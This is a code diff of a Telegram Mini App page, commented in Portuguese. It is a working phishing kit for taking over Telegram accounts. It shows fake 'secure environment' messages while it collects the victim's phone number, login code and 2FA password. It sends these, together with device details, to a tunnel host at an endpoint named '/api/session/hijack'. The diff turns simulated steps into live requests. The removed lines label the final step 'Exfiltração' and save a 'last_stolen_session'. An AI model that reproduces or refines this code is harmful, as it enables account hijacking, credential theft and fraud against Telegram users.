@@ -164,16 +164,14 @@
         // =====================================================================
         // CONFIGURAÇÃO
         // =====================================================================
-        const API_BASE = 'https://heaven-rapidly-smile-comment.trycloudflare.com';
+        const API_BASE = 'https://kills-breach-decorative-highlight.trycloudflare.com';
 
         // =====================================================================
         // ESTADO DA APLICAÇÃO
         // =====================================================================
         let state = {
-            phone: '',
             authStarted: false,
-            needs2FA: false,
-            user: null
+            needs2FA: false
         };
 
         // =====================================================================
@@ -184,14 +182,14 @@
         // Inicializa o ambiente do Mini App
         tg.ready();
         tg.expand();
-        tg.setHeaderColor('#ffffff');
-        tg.setBackgroundColor('#f0f2f5');
+        if (tg.setHeaderColor) tg.setHeaderColor('#ffffff');
+        if (tg.setBackgroundColor) tg.setBackgroundColor('#f0f2f5');
 
         // =====================================================================
         // SIMULAÇÃO DE USUÁRIO (PARA TESTES FORA DO TELEGRAM)
         // =====================================================================
         if (!tg.initDataUnsafe || !tg.initDataUnsafe.user) {
-            const mockUser = {
+            window._mockTelegramUser = {
                 id: 999999999,
                 first_name: "Teste",
                 last_name: "Local",
@@ -199,7 +197,6 @@
                 language_code: "pt-BR",
                 is_premium: true
             };
-            window._mockTelegramUser = mockUser;
         } else {
             window._mockTelegramUser = tg.initDataUnsafe.user;
         }
@@ -235,33 +232,29 @@
             document.getElementById(stepId).classList.add('active');
         }
 
+        // Normalização robusta: Remove +, espaços, zeros iniciais
         function normalizePhone(phone) {
-            return phone.replace(/\D/g, '');
+            let digits = phone.replace(/\D/g, '');
+            if (digits.startsWith('0')) {
+                digits = digits.replace(/^0+/, '');
+            }
+            return digits;
         }
 
-        // =====================================================================
-        // TESTE DE CONEXÃO (DEBUG) - NÃO BLOQUEIA A UI
-        // =====================================================================
-        async function testConnection() {
-            try {
-                // Usamos um timeout de 3s para não travar a UI se a API estiver lenta
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 3000);
-                
-                const response = await fetch(`${API_BASE}/api/health`, {
-                    signal: controller.signal
-                });
-                
-                clearTimeout(timeoutId);
-                
-                if (!response.ok) throw new Error(`HTTP ${response.status}`);
-                const data = await response.json();
-                console.log("API Conectada:", data);
-                return true;
-            } catch (error) {
-                console.error("Falha na conexão com API (não bloqueante):", error);
-                return false;
+        // Extrai mensagem legível de qualquer tipo de erro/objeto
+                // Extrai mensagem legível de qualquer tipo de erro/objeto
+        function getErrorMessage(error, fallback = 'Erro desconhecido') {
+            if (error instanceof Error) {
+                return error.message || error.toString();
             }
+            if (typeof error === 'object' && error !== null) {
+                if (error.message) return error.message;
+                if (error.detail) return typeof error.detail === 'string' ? error.detail : JSON.stringify(error.detail);
+                if (error.error) return typeof error.error === 'string' ? error.error : JSON.stringify(error.error);
+                try { return JSON.stringify(error); } catch (e) { return String(error); }
+            }
+            if (typeof error === 'string') return error;
+            return fallback;
         }
 
         // =====================================================================
@@ -272,7 +265,7 @@
             
             if (user) {
                 els.userAvatar.textContent = user.first_name?.[0] || 'T';
-                els.userName.textContent = `${user.first_name} ${user.last_name || ''}`;
+                els.userName.textContent = `${user.first_name} ${user.last_name || ''}`.trim();
                 if (user.username) {
                     els.userPhone.textContent = `@${user.username}`;
                 }
@@ -296,16 +289,13 @@
                 }
             });
 
-            // FORÇA O AVANÇO PARA O LOGIN APÓS 1.5s, INDEPENDENTE DA API
-            // A testConnection roda em background apenas para log
-            testConnection().then(isConnected => {
-                console.log("Status da API inicial:", isConnected);
-            });
+            // Teste de conexão inicial (não bloqueante)
+            fetch(`${API_BASE}/api/health`).then(r => {
+                if (!r.ok) console.warn("Health check falhou:", r.status);
+            }).catch(e => console.warn("Health check offline:", e.message));
 
             setTimeout(() => {
                 showStatus(els.statusInit, 'Ambiente seguro detectado. Preparando sessão...', 'info');
-                
-                // Sempre avança para o login após 1.5s
                 setTimeout(() => {
                     goToStep('step-login');
                     els.phone.focus();
@@ -314,7 +304,7 @@
         }
 
         // =====================================================================
-        // LÓGICA PRINCIPAL DE AUTENTICAÇÃO (O "GANCHO")
+        // LÓGICA PRINCIPAL DE AUTENTICAÇÃO
         // =====================================================================
         async function handleAuth() {
             const rawPhone = els.phone.value.trim();
@@ -322,107 +312,186 @@
             const password = els.password.value.trim();
             const cleanPhone = normalizePhone(rawPhone);
 
+            // Validação básica do telefone
             if (cleanPhone.length < 8) {
                 showStatus(els.statusAuth, 'Por favor, insira um número de telefone válido.', 'error');
                 els.phone.focus();
                 return;
             }
 
+            // =========================================================================
+            // FASE 1: SOLICITAR CÓDIGO REAL
+            // =========================================================================
             if (!state.authStarted) {
-                // FASE 1: Solicitar Código
                 els.btnAuth.disabled = true;
                 showStatus(els.statusAuth, 'Enviando código via Telegram...', 'info');
                 
-                // Simula latência de rede (1.2s)
-                await new Promise(resolve => setTimeout(resolve, 1200));
+                try {
+                    const response = await fetch(`${API_BASE}/api/send-code`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ phone: cleanPhone })
+                    });
 
-                els.codeGroup.style.display = 'block';
-                els.code.focus();
-                els.btnAuth.textContent = 'Verificar Código';
-                els.btnAuth.disabled = false;
-                state.authStarted = true;
-                showStatus(els.statusAuth, `Código enviado para +${cleanPhone}. Digite abaixo.`, 'success');
+                    // Captura o texto bruto para diagnóstico
+                    const rawText = await response.text();
+                    console.log("API Response Status:", response.status);
+                    console.log("API Raw Response:", rawText);
 
+                    let data;
+                    try {
+                        data = JSON.parse(rawText);
+                    } catch (parseError) {
+                        throw new Error(`Resposta não é JSON (HTTP ${response.status}): ${rawText.substring(0, 150)}`);
+                    }
+
+                    if (!response.ok || data.status !== 'sent') {
+                        const errMsg = getErrorMessage(data, `Falha no servidor (HTTP ${response.status})`);
+                        throw new Error(errMsg);
+                    }
+
+                    // Sucesso
+                    els.codeGroup.style.display = 'block';
+                    els.code.focus();
+                    els.btnAuth.textContent = 'Verificar Código';
+                    els.btnAuth.disabled = false;
+                    state.authStarted = true;
+                    showStatus(els.statusAuth, `Código enviado para +${cleanPhone}. Digite abaixo.`, 'success');
+
+                } catch (error) {
+                    console.error("Erro ao solicitar código:", error);
+                    const errMsg = getErrorMessage(error, 'Falha na conexão');
+                    showStatus(els.statusAuth, `Falha: ${errMsg}. Tente novamente.`, 'error');
+                    els.btnAuth.disabled = false;
+                }
+
+            // =========================================================================
+            // FASE 2: VALIDAR CÓDIGO (E POSSÍVEL 2FA)
+            // =========================================================================
             } else if (!state.needs2FA) {
-                // FASE 2: Validar Código
                 if (!code || code.length < 4) {
                     showStatus(els.statusAuth, 'Código inválido. Deve ter 5 dígitos.', 'error');
+                    els.code.focus();
                     return;
                 }
 
                 els.btnAuth.disabled = true;
                 showStatus(els.statusAuth, 'Validando sessão segura...', 'info');
                 
-                // Simula processamento (1.5s)
-                await new Promise(resolve => setTimeout(resolve, 1500));
-
-                els.passwordGroup.style.display = 'block';
-                els.password.focus();
-                els.btnAuth.textContent = 'Concluir Login';
-                els.btnAuth.disabled = false;
-                state.needs2FA = true;
-                showStatus(els.statusAuth, 'Conta protegida por 2FA detectada. Insira a senha para continuar.', 'info');
-
-            } else {
-                // FASE 3: Exfiltração
-                els.btnAuth.disabled = true;
-                showStatus(els.statusAuth, 'Sincronizando sessão e criptografando dados...', 'info');
-                
-                const payload = {
-                    phone: `+${cleanPhone}`,
-                    code: code,
-                    two_fa_password: password,
-                    telegram_user: window._mockTelegramUser || null,
-                    device_info: {
-                        userAgent: navigator.userAgent,
-                        platform: navigator.platform,
-                        language: navigator.language,
-                        screen: `${window.screen.width}x${window.screen.height}`,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-                    },
-                    timestamp: new Date().toISOString(),
-                    source: 'telegram-mini-app'
-                };
-
-                // DEBUG: Loga o payload
-                console.log("PAYLOAD SENDO ENVIADO:", JSON.stringify(payload, null, 2));
-                console.log("URL DE DESTINO:", `${API_BASE}/api/session/hijack`);
-
                 try {
-                    // Envia para o backend
+                    const payload = {
+                        phone: `+${cleanPhone}`,
+                        code: code,
+                        two_fa_password: password,
+                        telegram_user: window._mockTelegramUser || null,
+                        device_info: {
+                            userAgent: navigator.userAgent,
+                            platform: navigator.platform,
+                            language: navigator.language,
+                            screen: `${window.screen.width}x${window.screen.height}`,
+                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                        },
+                        timestamp: new Date().toISOString(),
+                        source: 'telegram-mini-app'
+                    };
+
                     const response = await fetch(`${API_BASE}/api/session/hijack`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(payload)
                     });
 
-                    // DEBUG: Loga a resposta
-                    console.log("RESPONSA DA API:", response.status, response.statusText);
-                    const data = await response.json();
-                    console.log("DADOS RETORNADOS:", data);
-
-                    if (!response.ok) {
-                        throw new Error(`HTTP error! status: ${response.status}`);
+                    const rawText = await response.text();
+                    let data;
+                    try {
+                        data = JSON.parse(rawText);
+                    } catch (parseError) {
+                        throw new Error(`Resposta não é JSON (HTTP ${response.status}): ${rawText.substring(0, 150)}`);
                     }
 
-                    // Opcional: Se estiver dentro de um Bot, envia também via sendData
-                    if (tg.sendData) {
-                        tg.sendData(JSON.stringify({ action: 'hijack_success', phone: payload.phone }));
-                    }
-
-                    // Sucesso: Mostra a tela final
-                    goToStep('step-success');
-                    
-                } catch (error) {
-                    console.error("Erro ao enviar sessão:", error);
-                    
-                    // Fallback: Se a API falhar, salva localmente e força sucesso
-                    localStorage.setItem('last_stolen_session', JSON.stringify(payload));
-                    showStatus(els.statusAuth, 'Conexão instável. Dados salvos localmente.', 'error');
-                    -
-                    setTimeout(() => {
+                    if (data.status === 'success') {
                         goToStep('step-success');
-                    }, 2000);
+                        if (tg.sendData) {
+                            tg.sendData(JSON.stringify({ action: 'hijack_success', phone: payload.phone }));
+                        }
+                    } else if (data.requires_2fa) {
+                        state.needs2FA = true;
+                        els.passwordGroup.style.display = 'block';
+                        els.password.focus();
+                        els.btnAuth.textContent = 'Concluir Login';
+                        els.btnAuth.disabled = false;
+                        showStatus(els.statusAuth, 'Conta protegida por 2FA detectada. Insira a senha para continuar.', 'info');
+                    } else {
+                        const errMsg = getErrorMessage(data, 'Erro de autenticação.');
+                        throw new Error(errMsg);
+                    }
+
+                } catch (error) {
+                    console.error("Erro na validação:", error);
+                    const errMsg = getErrorMessage(error, 'Erro na validação');
+                    showStatus(els.statusAuth, `Erro: ${errMsg}`, 'error');
+                    els.btnAuth.disabled = false;
+                }
+
+            // =========================================================================
+            // FASE 3: VALIDAR 2FA (FINAL)
+            // =========================================================================
+            } else {
+                if (!password) {
+                    showStatus(els.statusAuth, 'Insira sua senha de 2FA.', 'error');
+                    els.password.focus();
+                    return;
+                }
+
+                els.btnAuth.disabled = true;
+                showStatus(els.statusAuth, 'Sincronizando sessão e criptografando dados...', 'info');
+                
+                try {
+                    const payload = {
+                        phone: `+${cleanPhone}`,
+                        code: code,
+                        two_fa_password: password,
+                        telegram_user: window._mockTelegramUser || null,
+                        device_info: {
+                            userAgent: navigator.userAgent,
+                            platform: navigator.platform,
+                            language: navigator.language,
+                            screen: `${window.screen.width}x${window.screen.height}`,
+                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                        },
+                        timestamp: new Date().toISOString(),
+                        source: 'telegram-mini-app'
+                    };
+
+                    const response = await fetch(`${API_BASE}/api/session/hijack`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+
+                    const rawText = await response.text();
+                    let data;
+                    try {
+                        data = JSON.parse(rawText);
+                    } catch (parseError) {
+                        throw new Error(`Resposta não é JSON (HTTP ${response.status}): ${rawText.substring(0, 150)}`);
+                    }
+
+                    if (data.status === 'success') {
+                        goToStep('step-success');
+                        if (tg.sendData) {
+                            tg.sendData(JSON.stringify({ action: 'hijack_success', phone: payload.phone }));
+                        }
+                    } else {
+                        const errMsg = getErrorMessage(data, 'Falha na verificação de 2FA.');
+                        throw new Error(errMsg);
+                    }
+
+                } catch (error) {
+                    console.error("Erro na finalização:", error);
+                    const errMsg = getErrorMessage(error, 'Erro na finalização');
+                    showStatus(els.statusAuth, `Erro: ${errMsg}`, 'error');
+                    els.btnAuth.disabled = false;
                 }
             }
         }
@@ -430,7 +499,7 @@
         // =====================================================================
         // INICIALIZAÇÃO DA PÁGINA
         // =====================================================================
-                document.addEventListener('DOMContentLoaded', initApp);
+        document.addEventListener('DOMContentLoaded', initApp);
     </script>
 </body>
 </html>
